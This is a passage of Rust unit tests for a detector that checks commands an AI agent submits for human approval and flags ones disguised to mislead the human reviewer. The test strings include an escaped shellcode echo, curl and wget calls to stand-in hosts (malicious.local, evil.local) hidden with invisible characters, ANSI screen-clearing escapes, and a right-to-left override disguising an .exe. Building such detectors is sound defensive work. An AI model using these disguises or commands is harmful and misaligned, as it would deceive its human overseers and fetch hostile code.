            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));

        let shellcode = "echo -ne '\\x90\\x90\\x90\\x90\\x31\\xc0'";
        let shellcode_indicators = HitlCognitiveFirewall::scan_for_visual_deception(shellcode);
        assert!(shellcode_indicators
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));
    }

    #[test]
    fn test_hitl_cognitive_firewall_soft_hyphen_and_ansi_escape() {
        let soft_hyphen = "curl\u{00AD} http://malicious.local";
        let indicators1 = HitlCognitiveFirewall::scan_for_visual_deception(soft_hyphen);
        assert!(indicators1
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::ZeroWidthSteganography(_))));

        let mongolian = "wget\u{180E} http://evil.local";
        let indicators2 = HitlCognitiveFirewall::scan_for_visual_deception(mongolian);
        assert!(indicators2
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::ZeroWidthSteganography(_))));

        let ansi = "Status: OK\x1b[2JOverwritten!";
        let indicators3 = HitlCognitiveFirewall::scan_for_visual_deception(ansi);
        assert!(indicators3
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::AnsiEscapeInjection(_))));
    }

    #[test]
    fn test_hitl_cognitive_firewall_threshold_boundaries() {
        // Low divergence: benign task with benign tool -> StandardHitlAllowed
        let benign = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Read documentation",
            "Inspecting README.md",
            "read_file",
            "C:\\workspace\\README.md",
            "",
            MeshTaintLevel::TrustedInternal,
        );
        match benign {
            HitlFirewallDecision::StandardHitlAllowed { blast_radius } => {
                assert!(blast_radius.divergence_score < 0.45);
            }
            other => panic!("Expected StandardHitlAllowed, got {:?}", other),
        }

        // Auto-veto on RTLO override
        let rtlo = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Run script",
            "Executing benign file",
            "shell_exec",
            "test\u{202E}fdp.exe",
            "",
            MeshTaintLevel::TrustedInternal,
        );
        assert!(matches!(
            rtlo,
            HitlFirewallDecision::AutoVetoDeceptive { .. }
        ));
    }
}
